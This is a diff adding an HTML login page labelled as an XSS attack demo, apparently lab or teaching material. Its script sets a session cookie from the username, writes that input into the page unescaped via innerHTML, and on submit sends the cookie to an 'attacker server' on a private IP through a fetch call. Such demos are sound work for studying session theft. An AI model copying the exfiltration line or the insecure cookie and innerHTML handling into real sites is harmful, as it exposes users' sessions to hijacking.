@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page - XSS Attack Demo</title>
+</head>
+<body>
+    <h2>Login</h2>
+    <form id="loginForm">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+        <br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+        <br>
+        <button type="submit">Login</button>
+    </form>
+
+    <h3>User Dashboard</h3>
+    <p id="welcomeMessage"></p>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            
+            let username = document.getElementById("username").value;
+            let password = document.getElementById("password").value;
+
+            if (username && password) {
+                document.cookie = "session=" + username + "-session-id; path=/"; // Vulnerable session cookie
+                document.getElementById("welcomeMessage").innerHTML = "<b>Welcome, " + username + "!</b> Your session is now active.";
+
+                // 🔴 Automatically send the session cookie to the attacker server
+                fetch("http://192.168.64.2:4000/steal?cookie=" + document.cookie);
+            }
+        });
+
+        // Simulate session hijacking by displaying the stored session
+        function getCookie(name) {
+            let match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+            return match ? match[2] : null;
+        }
+
+        let session = getCookie("session");
+        if (session) {
+            document.getElementById("welcomeMessage").innerHTML = "<b>Welcome back!</b> Your active session: " + session;
+        }
+    </script>
+</body>
+</html>
+
